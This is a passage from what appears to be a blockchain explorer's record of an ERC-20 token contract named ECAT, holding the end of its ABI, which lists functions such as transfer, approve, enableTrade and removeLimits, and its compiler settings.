},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createPairs\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwaps\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ECAT", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f70269e837ae0da2d59fd2f4ea104f12f9990b411ce77fc57f7eca2e577fd392"}